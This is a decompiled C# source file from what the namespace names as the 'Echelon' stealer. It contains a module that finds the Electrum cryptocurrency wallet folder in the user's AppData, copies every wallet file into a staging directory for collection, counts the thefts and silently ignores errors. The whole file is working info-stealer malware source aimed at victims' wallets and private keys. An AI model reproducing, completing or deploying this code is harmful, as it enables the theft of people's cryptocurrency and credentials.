using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000D RID: 13
	internal class Electrum
	{
		// Token: 0x06000039 RID: 57 RVA: 0x00019A60 File Offset: 0x00017C60
		public static void EleStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Electrum.ElectrumDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Electrum.ElectrumDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Electrum.ElectrumDir);
						fileInfo.CopyTo(directorypath + Electrum.ElectrumDir + fileInfo.Name);
					}
					Electrum.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400003B RID: 59
		public static int count;

		// Token: 0x0400003C RID: 60
		public static string ElectrumDir = "\\Wallets\\Electrum\\";

		// Token: 0x0400003D RID: 61
		public static string ElectrumDir2 = Help.AppDate + "\\Electrum\\wallets";
	}
}
